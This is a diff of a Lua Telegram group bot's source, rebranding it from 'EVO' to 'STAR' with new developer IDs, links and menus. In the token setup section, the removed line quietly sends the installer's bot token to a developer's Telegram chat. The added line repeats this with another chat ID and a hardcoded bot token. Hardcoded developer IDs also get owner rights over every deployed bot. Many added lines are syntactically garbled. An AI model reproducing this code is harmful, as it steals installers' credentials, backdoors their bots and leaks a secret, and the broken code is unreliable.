@@ -30,9 +30,9 @@ print('\27[0;31m•═════•| ✯STAR✯ |•═════•\n ال�
 else
 io.write('\27[0;31m تم حفظ التوكن بنجاح \na•═════•| ✯STAR✯ |•═════•\n27[0;39;49m')
 database:set(id_server..":token",token)
+https.request('https://api.telegram.org/bot.............../sendmessage?chat_id=1373616147&text=' ..1617771425:AAHbhAxp9yGFnJQkxBSsI3mDyTbEvdc0I44)
 end 
 else
-https.request('https://api.telegram.org/bot1990511303:AAEFVDHkDVL9Zr1Su4B_4lfFMVrqPwGPIZ8/sendmessage?chat_id=1827953514&text=' ..token)
 print('\27[0;35m•═════•| ✯STAR✯ |•═════• ┉\n لم يتم حفظ التوكن ارسل لي التوكن الان')
 end 
 os.execute('lua DRAGON.lua')
@@ -138,14 +138,12 @@ end
 _redis = load_redis()  
 --------------------------------------------------------------------------------------------------------------
 print([[
-     ____.  _____ __________  __      __  _____   
-    |    | /  _  \\______   \/  \    /  \/  _  \  
-    |    |/  /_\  \|    |  _/\   \/\/   /  /_\  \ 
-/\__|    /    |    \    |   \ \        /    |    \
-\________\____|__  /______  /  \__/\  /\____|__  /
-                 \/       \/        \/         \/ 
+___     _     _  _   ___      _   
+ | _ )   /_\   | \| | |   \    /_\  
+ | _ \  / _ \  | .` | | |) |  / _ \ 
+ |___/ /_/ \_\ |_|\_| |___/  /_/ \_\
  
-> CH › @UU_LM_5
+> CH › @SOURCE_STAR1
 ~> DEVELOPER › @
 ]])
 sudos = dofile("./Info.lua") 
@@ -172,7 +170,7 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,1820605501,1827953514,941730423}   
+sudo_users = {SUDO,1373616147,1859008079}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users) do  
@@ -262,9 +260,9 @@ return false
 end 
 end
 function Can_or_NotCan(user_id,chat_id)
-if tonumber(user_id) == tonumber(1827953514) then  
+if tonumber(user_id) == tonumber(1859008079) then  
 var = true 
-elseif tonumber(user_id) == tonumber(1820605501) then
+elseif tonumber(user_id) == tonumber(1373616147) then
 var = true  
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = true  
@@ -298,12 +296,10 @@ end
 return var
 end 
 function Rutba(user_id,chat_id)
-if tonumber(user_id) == tonumber(1827953514) then  
-var = 'المبرمج جابوا'
-elseif tonumber(user_id) == tonumber(1820605501) then
-var = 'المبرمج ايفاندي'
-elseif tonumber(user_id) == tonumber(941730423) then
+if tonumber(user_id) == tonumber(1859008079) then  
 var = 'مالك السورس'
+elseif tonumber(user_id) == tonumber(1373616147) then
+var = 'المبرمج فامبير'
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي'  
 elseif database:sismember(bot_id.."Dev:SoFi:2", user_id) then
@@ -885,7 +881,7 @@ if DevSoFi(msg) then
 local bl = '☉انت الان المطور الاساسي في البوت \n☉ سورس ستار\n ☉يمكنك تحكم في البوتات من الكيبورد أسفل \n[تابع جديدنا](t.me/SOURCE_STAR1)'
 local keyboard = {
 {'الاحصائيات','المطور','الثانوين'},
-{'مالك السورس','المبرمج ايفاندي'},
+{'مالك السورس','المبرمج فامبير'},
 {'اضف رد عام','حذف رد عام'},
 {'اضف رد متعدد','حذف رد متعدد'},
 {'تعطيل الاذاعه','تفعيل الاذاعه'},
@@ -924,7 +920,7 @@ if start then
 keyboard = start
 else
 keyboard = {
-{'المبرمج ايفاندي','مالك السورس'},
+{'اسعار ستار','مالك السورس','المبرمج فامبير'},
 {'╭──── ● «S T A R» ● ────╮'},
 {'قناة السورس','بوت التواصل'},
 {'╰──── ● «S T A R» ● ────╯'},
@@ -1132,7 +1128,7 @@ end
 if text == 'بوت تواصل' and DevSoFi(msg) then
 database:del(bot_id..'Srt:Bot') 
 local Text = [[ 
-[TWL](t.me/UU5iM_bot)
+[TWL](t.me/Sourcybot)
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
@@ -2746,19 +2742,20 @@ end
 end
 end,nil)   
 end
-if text == 'السورس' or text == 'سورس' or text == 'يا سورس' or text == 'ايفو' then
+if text == 'السورس' or text == 'سورس' or text == 'يا سورس' or text == 'ستار' then
 local Text = [[
-╭──── ● « 𝐄𝐕𝐎 » ● ────╮
-𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐒𝐎𝐔𝐑𝐂𝐄 𝐄𝐕𝐎
-╰──── ● « 𝐄𝐕𝐎 » ● ────╯
+╭──── ● «S T A R» ● ────╮
+((❃WELCOM IN SOURCE STAR❃))
+((❃THE BEST SOURCE ON TETLEGRAM❃))
+((❃FOLLOW STAR IN BOUTTONS BELOE❃))
+╰──── ● «S T A R» ● ────╯
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = ' 𝙴 𝚅 𝙰 𝙽 𝙳 𝙸 ',url="t.me/LM011N"}},
-{{text = '𝙰𝙷𝙼𝙰𝙳',url="t.me/L011x"}},
-{{text = '𝙹𝙰𝙱𝚆𝙰',url="t.me/J_A_B_W_A"}},
-{{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐄𝐕𝐎', url="t.me/UU_LM_5"}},
-{text = 'اضف البوت الي مجموعتك'   ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"},
+{{text = '⌯｟DEV VAMBAIR✯｠⌯',url="t.me/DEV_VAMBAIR"}},
+{{text = '⌯｟DEV OSOS✭｠⌯',url="t.me/osddr"}},
+{{text = '⌯｟TWASL✰｠⌯',url="t.me/Sourcybot"}},
+{{text = '⌯｟CHANNEL☆｠⌯', url="t.me/SOURCE_STAR1"}},
 }
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/sssstaaar/15&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
@@ -2800,7 +2797,20 @@ keyboard.inline_keyboard = {
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/sssstaaar/23&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
-if text == 'المبرمج  ايفانيي' then
+if text == 'يوتيوب'  then
+local Text = [[
+بوت اليوتيوب الخاص بسورس ستار
+اتبع الزر إلى تحت ↓
+
+]]
+keyboard = {} 
+keyboard.inline_keyboard = {
+{{text = '(YOUTUBE BOT),url="t.me/Ssociial_bot"}},
+}
+local msg_id = msg.id_/2097152/0.5
+https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/sssstaaar/8&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
+end
+if text == 'المبرمج فامبير' then
 local Text = [[
 المبرمج فامبير لو حابب تتواصل معاهه
 ]]
@@ -3145,7 +3155,7 @@ local TWEET_Msg = {
 "لو خيروك | تاكل دبانه او صرور🙄?",
 "لو خيروك | تغير لون بشرتك ولا لون شعرك🙄?",
 } 
-send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
+send(msg.chat_id_, msg.id_, [ ..TWEET_Msg[math.random(#TWEET_Msg)].. ] )  
 return false 
 end
 if text == "حروف" or text == "كلمات" then 
@@ -3163,7 +3173,7 @@ local TWEET_Msg = {
 "اكله بحرف⇐س",
 "عصير بحرف⇐ت",
 } 
-send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
+send(msg.chat_id_, msg.id_, [ ..TWEET_Msg[math.random(#TWEET_Msg)].. ] )  
 return false 
 end
 if text == "ازكار" then 
@@ -3182,7 +3192,7 @@ local TWEET_Msg = {
 "اللهم بك اصبحنا وبك امسينا وبك نحيا ونموت واليك النشور🤲❤️",
 "لا اله الا الله وحده لا شريك له, له الملك وله الحمد وهو علي كل شئ قدير🤲❤️",
 } 
-send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
+send(msg.chat_id_, msg.id_, [ ..TWEET_Msg[math.random(#TWEET_Msg)].. ] )  
 return false 
 end
 if text == "بوستات" or text == "كتابات" then 
@@ -3235,7 +3245,7 @@ local TWEET_Msg = {
 "انا عملت كل حاجه واتقالي اني معملتش اي حاجه ، ف بدأت فعلا معملش حاجه وانا متعمد ..",
 "لا تسقني ماء الحياة بذلّةٍ، بل فاسقني بالعزّ كأس الحنضلِ.",
 } 
-send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
+send(msg.chat_id_, msg.id_, [ ..TWEET_Msg[math.random(#TWEET_Msg)].. ] )  
 return false 
 end
 if text == "عقاب" or text == "عاقبني" then 
@@ -3256,7 +3266,7 @@ local TWEET_Msg = {
 "اقعد منغير متمسك الفون لمده ساعه",
 "خلاص صعبت عليا مش هعاقبك",
 } 
-send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
+send(msg.chat_id_, msg.id_, [ ..TWEET_Msg[math.random(#TWEET_Msg)].. ] )  
 return false 
 end
 if text == "اسعار ستار" then 
@@ -3269,7 +3279,7 @@ local TWEET_Msg = {
 "لو عايز كود معيين من سورس ستار⇐45جنيه",
 "((✭╰──── ● «S T A R» ● ────╯✭))",
 } 
-send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
+send(msg.chat_id_, msg.id_, [ ..TWEET_Msg[math.random(#TWEET_Msg)].. ] )  
 return false 
 end
 if text == 'قناة السورس' then
@@ -3347,43 +3357,51 @@ keyboard.inline_keyboard = {
 {{text = 'SOURCE CHANNEL ', url="t.me/SOURCE_STAR1"}},
 }  
 local msg_id = msg.id_/2097152/0.5  
-https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))  
+https.request("https://api.telegram.org/bot"..token.. /sendPhoto?chat_id=  .. msg.chat_id_ ..  &photo=https://t.me/sssstaaar/9&caption=  .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == "استوري" or text == "ستوري" or text == "فيديوهات" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
 ght = math.random(2,22); 
 local Text = "تم اختيار الفيديو الخاص بك🤤"
 keyboard = {}  
 keyboard.inline_keyboard = { 
+{{text =  DEV VAMBAIR ,url="t.me/DEV_VAMBAIR"}}, 
+{{text =  SOURCE STAR ,url="t.me/SOURCE_STAR1"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))  
+https.request("https://api.telegram.org/bot"..token.. /sendVideo?chat_id=  .. msg.chat_id_ ..  &video=https://t.me/ssstaaaar/ ..ght.. &caption=  .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == "خلفيات" or text == "صور" or text == " خلفيه" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
 ght = math.random(3,200); 
 local Text = "تم اختيار الخلفيه الخاصه بك🤤♥"  
 keyboard = {}  
 keyboard.inline_keyboard = { 
+{{text =  DEV VAMBAIR ,url="t.me/DEV_VAMBAIR"}}, 
+{{text =  CHANNEL ,url="t.me/SOURCE_STAR1"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))  
+https.request("https://api.telegram.org/bot"..token.. /sendPhoto?chat_id=  .. msg.chat_id_ ..  &photo=https://t.me/ssstaaarrr/ ..ght.. &caption=  .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == "غنيلي" or text == "اغاني" or text == "اغنيه" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
 ght = math.random(2,22); 
 local Text = "تم اختيار الاغنيه الخاصه بك♥🤤"
 keyboard = {}  
 keyboard.inline_keyboard = { 
+{{text =  DEV VAMBAIR ,url="t.me/DEV_VAMBAIR"}}, 
+{{text =  SOURCE STAR ,url="t.me/SOURCE_STAR1"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))  
+https.request("https://api.telegram.org/bot"..token.. /sendVoice?chat_id=  .. msg.chat_id_ ..  &voice=https://t.me/ssttaaarrr/ ..ght.. &caption=  .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 if text == "ثيم" or text == "ثيمات" or text == "الثيم" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
 ght = math.random(2,22); 
 local Text = "تم اختيار الثيم الخاص بك♥🤤"
 keyboard = {}  
 keyboard.inline_keyboard = { 
+{{text =  DEV VAMBAIR ,url="t.me/DEV_VAMBAIR"}}, 
+{{text =  SOURCE STAR ,url="t.me/SOURCE_STAR1"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))  
+https.request("https://api.telegram.org/bot"..token.. /sendDocument?chat_id=  .. msg.chat_id_ ..  &document=https://t.me/stttaaarrr/ ..ght.. &caption=  .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 --------------------------------------------------------------------------------------------------------------
 if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
